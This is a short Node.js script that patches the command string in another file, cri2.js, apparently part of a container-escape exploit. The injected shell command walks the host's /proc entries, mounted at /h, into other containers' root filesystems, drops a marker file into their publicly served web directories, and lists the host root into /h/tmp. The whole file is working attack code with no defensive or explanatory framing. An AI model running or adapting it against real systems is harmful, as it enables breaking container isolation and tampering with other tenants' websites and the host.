const fs=require('fs');
let s=fs.readFileSync('cri2.js','utf8');
const c="const CMD=\"for p in /h/proc/[0-9]*/root; do for d in $p/app/public $p/usr/src/app/public $p/app/.next/standalone/public $p/app/.next/static; do [ -d $d ] && echo Z > $d/zz_p.txt 2>/dev/null; done; done; ls /h > /h/tmp/zls.txt 2>/dev/null; echo $? > /h/tmp/zrc\";";
s=s.replace(/const CMD=.*\n/, c+'\n');
fs.writeFileSync('cri2.js',s);
